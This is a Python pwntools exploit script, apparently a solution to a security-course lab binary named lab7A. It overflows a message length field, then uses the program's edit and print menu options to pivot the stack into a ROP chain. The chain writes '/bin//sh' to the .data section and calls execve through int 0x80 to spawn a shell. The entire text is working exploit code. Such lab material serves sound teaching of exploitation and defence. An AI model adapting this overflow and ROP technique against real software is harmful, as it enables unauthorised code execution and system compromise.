from pwn import *
from struct import pack

context(arch='i386', os='linux')

BIN_PATH = "/hdd/VM-Shared/levels/lab07/lab7A"
SPACE_BETWEEN_CHUNKS = 0xAE0 - 0x9D0

ESP_PIVOT = pack('<I', 0x08048fcd)  # add esp, 0x24 ; pop ebx ; pop ebp ; ret
MOV_EAX_EDX = pack('<I', 0x080671c4)  # mov eax, edx ; ret
XCHG_EAX_ESP = pack('<I', 0x0804bb6c)  # xchg eax, esp ; ret

binary = ELF(BIN_PATH)
rop = ROP(binary)


def build_rop_chain():
    rop_chain = ''

    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
    rop_chain += pack('<I', 0x080ed000)  # @ .data
    rop_chain += pack('<I', 0x080bd226)  # pop eax ; ret
    rop_chain += '/bin'
    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
    rop_chain += pack('<I', 0x080ed004)  # @ .data + 4
    rop_chain += pack('<I', 0x080bd226)  # pop eax ; ret
    rop_chain += '//sh'
    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
    rop_chain += pack('<I', 0x08055b40)  # xor eax, eax ; ret
    rop_chain += pack('<I', 0x080a3a1d)  # mov dword ptr [edx], eax ; ret
    rop_chain += pack('<I', 0x080481c9)  # pop ebx ; ret
    rop_chain += pack('<I', 0x080ed000)  # @ .data
    rop_chain += pack('<I', 0x080e76ad)  # pop ecx ; ret
    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
    rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
    rop_chain += pack('<I', 0x080ed008)  # @ .data + 8
    rop_chain += pack('<I', 0x08055b40)  # xor eax, eax ; ret
    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
    rop_chain += pack('<I', 0x08098e30)  # add eax, 3 ; ret
    rop_chain += pack('<I', 0x08098e17)  # add eax, 2 ; ret
    rop_chain += pack('<I', 0x08048ef6)  # int 0x80

    return rop_chain


p = process(BIN_PATH)

# p = gdb.debug(BIN_PATH, '''
# break main
# ''')

log.info("Message #1 - Overflowing max_len")
p.recvuntil("Enter Choice:")
p.sendline("1")
p.sendline("131")
p.sendline("x" * 131)

log.info("Message #2 - Preparing room for ROP chain")
p.recvuntil("Enter Choice:")
p.sendline("1")
p.sendline("100")
p.sendline("JUNK" * 25)

log.info("Message #1 - Write ROP chain (with edit)")
p.recvuntil("Enter Choice:")
p.sendline("2")
p.sendline("0")
# Change ESP to proper ROP
p.sendline("x" * (SPACE_BETWEEN_CHUNKS - 132) + ESP_PIVOT + "B" * 0x2C + build_rop_chain())

log.info("Message #2 - Print & write ROP with code execution")
p.recvuntil("Enter Choice:")
p.sendline("4")
# Change ESP to message[1]
p.sendline("1xxx" + "a"* 8 + MOV_EAX_EDX + XCHG_EAX_ESP)